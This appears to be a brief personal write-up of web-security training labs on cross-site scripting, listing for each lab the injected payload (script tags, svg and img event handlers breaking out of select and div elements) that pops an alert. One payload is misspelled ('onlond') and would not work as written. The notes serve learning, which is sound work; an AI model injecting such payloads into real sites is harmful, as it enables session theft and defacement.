# Labs
### Reflected XSS into HTML context with nothing encoded
```<script>alert(1)</script>``` in search box.

<br>

### Stored XSS into HTML context with nothing encoded
```<script>alert(1)</script>``` in comment section.

<br>

### DOM XSS in document.write sink using source location.search
<img width="500" src="https://user-images.githubusercontent.com/68285613/146972401-767cfebe-24de-403c-b447-e028a8b35f77.png">

``` "><svg onlond=alert(1)>``` in search box.

<br>

### DOM XSS in document.write sink using source location.search inside a select element

<img width="500" src="https://user-images.githubusercontent.com/68285613/146982039-d5264792-8f54-4e75-bd1e-4d18056a0ad6.png">

Once determined it's able to use url to write into script, 

use ```storeId="></select><img src=1 onerror=alert(1)>```.

<img width="500" src="https://user-images.githubusercontent.com/68285613/146986519-5c632667-cc06-49fb-90ac-ee63a4db6596.png">

### DOM XSS in innerHTML sink using source location.search
```</div><svg onload=alert(1)>``` in search box.

